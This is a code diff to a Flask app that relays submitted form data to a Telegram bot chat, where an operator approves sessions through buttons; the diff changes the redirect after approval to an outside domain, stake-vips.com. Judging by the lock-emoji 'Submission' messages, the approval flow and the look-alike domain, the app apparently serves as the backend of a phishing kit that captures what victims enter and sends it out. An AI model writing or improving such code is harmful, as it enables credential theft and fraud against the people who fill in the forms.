@@ -3,6 +3,7 @@ from flask_cors import CORS
 import os
 import uuid
 import requests
+import json
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -30,13 +31,15 @@ if not BOT_TOKEN or not CHAT_ID:
 SESSION_STATUS = {}
 
 # ======================
-# TELEGRAM SEND (WITH BUTTONS)
+# TELEGRAM SEND (FINAL)
 # ======================
 def send_to_telegram(data, session_id, type_):
     msg = f"🔐 {type_.upper()} Submission\n\n"
+
     for k, v in data.items():
-        msg += f"{k}: {v}\n"
-    msg += f"\nSession: {session_id}"
+        msg += f"• {k.upper()} : {v}\n"
+
+    msg += f"\nSESSION: {session_id}"
 
     keyboard = {
         "inline_keyboard": [
@@ -50,13 +53,15 @@ def send_to_telegram(data, session_id, type_):
     payload = {
         "chat_id": CHAT_ID,
         "text": msg,
-        "reply_markup": keyboard
+        "reply_markup": json.dumps(keyboard)
     }
 
     r = requests.post(
         f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-        json=payload
+        data=payload
     )
+
+    print("Telegram response:", r.text)
 
     return r.ok
 
@@ -150,7 +155,7 @@ def status(session_id):
 
 
 # ======================
-# TELEGRAM WEBHOOK (BUTTON HANDLER)
+# TELEGRAM WEBHOOK
 # ======================
 @app.route("/webhook", methods=["POST"])
 def webhook():
@@ -164,7 +169,7 @@ def webhook():
 
         if session_id in SESSION_STATUS:
             SESSION_STATUS[session_id]["approved"] = True
-            SESSION_STATUS[session_id]["redirect_url"] = f"/{page}"
+            SESSION_STATUS[session_id]["redirect_url"] = f"https://www.stake-vips.com/{page}"
 
     return jsonify({"ok": True})
 
